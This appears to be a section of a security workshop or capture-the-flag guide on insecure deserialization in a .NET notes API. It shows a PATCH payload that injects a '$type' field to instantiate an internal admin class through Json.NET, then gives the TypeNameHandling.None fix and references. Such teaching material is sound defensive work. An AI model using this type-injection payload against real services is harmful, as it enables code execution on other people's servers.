5. Insecure Deserialization
===========================
_Running .NET code using insecure deserialization._

The Fault: Run some basic C# code on server
-------------------------------------------

PATCH /notes/...

```json
{
    "content": "Nå er denne oppdatert",
    "properties": {
        "hack": {
            "$type": "Notes.Api.Admin.Secret, Notes.Api",
            "name": "Teodor"
        }
    }
}
```

References:
* [OWASP: Insecure Deserialization](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization)
* [How to configure Json.NET to create a vulnerable web API](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html)
* [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)

The Fix: Re-configure Json.NET
------------------------------

```csharp
options.SerializerSettings.TypeNameHandling = TypeNameHandling.None;
```

But now deserialization probably don't work as well. Deserializing generics securely is hard.

Maybe do DTO?

The Flag
--------
